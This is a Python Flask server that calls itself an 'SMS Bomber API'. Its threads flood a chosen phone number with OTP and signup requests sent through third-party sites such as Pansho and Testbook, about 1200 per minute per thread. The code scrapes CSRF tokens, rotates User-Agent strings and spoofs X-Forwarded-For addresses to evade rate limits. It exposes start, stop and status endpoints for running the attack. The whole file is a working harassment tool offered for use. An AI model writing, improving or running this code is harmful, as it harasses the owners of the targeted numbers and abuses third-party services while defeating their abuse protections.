from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime
from bs4 import BeautifulSoup

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'

# ===== LOAD DATA =====
def load_requests():
    try:
        with open(REQUESTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_stats(data):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def load_stats():
    try:
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}

# ===== GLOBALS =====
requests_data = load_requests()
stats_data = load_stats()
bombing_active = False
bombing_threads = []
bombing_lock = threading.Lock()

# ===== PANSHO SESSION REFRESH =====
def get_pansho_session():
    """Get fresh session for Pansho"""
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    
    try:
        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        token = None
        token_input = soup.find('input', {'name': '_token'})
        if token_input:
            token = token_input.get('value')
        if not token:
            meta = soup.find('meta', {'name': 'csrf-token'})
            if meta:
                token = meta.get('content')
        
        if not token:
            token = 'DUMMY_TOKEN'
        
        cookies = session.cookies.get_dict()
        return session, cookies, token
    except Exception as e:
        print(f"❌ Pansho session failed: {e}")
        return None, None, None

# ===== SEND REQUEST WITH RETRY =====
def send_with_retry(req, phone, max_retries=3):
    """Send request with retry on failure"""
    for attempt in range(max_retries):
        try:
            # For Pansho, get fresh session each time
            if 'pansho' in req['name'].lower():
                session, cookies, token = get_pansho_session()
                if not session:
                    continue
                headers = req['headers'].copy()
                headers['User-Agent'] = random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
                ])
                body = req['body'].replace('{phone}', phone).replace('{token}', token)
                r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
            else:
                # Testbook - fresh session
                session = req_lib.Session()
                headers = req['headers'].copy()
                headers['User-Agent'] = random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
                ])
                headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                if req['method'] == 'POST':
                    if isinstance(req['body'], dict):
                        r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=5)
                    else:
                        body = req['body'].replace('{phone}', phone)
                        r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
                else:
                    r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=5)
            
            # Success
            with bombing_lock:
                stats_data['total_requests'] += 1
                if r.status_code in [200, 302, 201, 202]:
                    stats_data['success'] += 1
                    save_stats(stats_data)
                    return True
                elif r.status_code == 429:
                    stats_data['rate_limited'] += 1
                    save_stats(stats_data)
                    return False
                else:
                    stats_data['failed'] += 1
                    save_stats(stats_data)
                    return False
                    
        except Exception as e:
            with bombing_lock:
                stats_data['total_requests'] += 1
                stats_data['failed'] += 1
                save_stats(stats_data)
            print(f"❌ Attempt {attempt+1} failed: {e}")
            time.sleep(0.2)
    
    return False

# ===== BOMBING WORKER =====
def bombing_worker(phone, req):
    """Worker thread for a single request type"""
    global bombing_active
    
    # Phone variations
    phone_variants = req.get('phones', [phone])
    if not phone_variants:
        phone_variants = [phone]
    
    while bombing_active:
        target_phone = random.choice(phone_variants)
        success = send_with_retry(req, target_phone)
        
        if success:
            print(f"✅ {req['name']} | {target_phone}")
        else:
            print(f"❌ {req['name']} | {target_phone}")
        
        # Speed: 0.05 sec = 1200 req/min per thread
        time.sleep(0.05)

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data
    })

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing():
    global bombing_active, bombing_threads, stats_data
    
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    # Reset stats
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_stats(stats_data)
    
    bombing_active = True
    bombing_threads = []
    
    # Start one thread per active request
    active_requests = [r for r in requests_data if r.get('active', True)]
    for req in active_requests:
        t = threading.Thread(target=bombing_worker, args=(phone, req))
        t.daemon = True
        t.start()
        bombing_threads.append(t)
        print(f"✅ Thread started for {req['name']}")
    
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone}",
        "phone": phone,
        "active_requests": len(active_requests)
    })

@app.route('/api/bomb/stop', methods=['POST'])
def stop_bombing():
    global bombing_active
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/status', methods=['GET'])
def bombing_status():
    return jsonify({
        "active": bombing_active,
        "stats": stats_data,
        "active_requests": sum(1 for r in requests_data if r.get('active', True))
    })

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

# ===== VERCEL ENTRY =====
app.debug = False

if __name__ == '__main__':
    app.run(debug=True, port=5000)
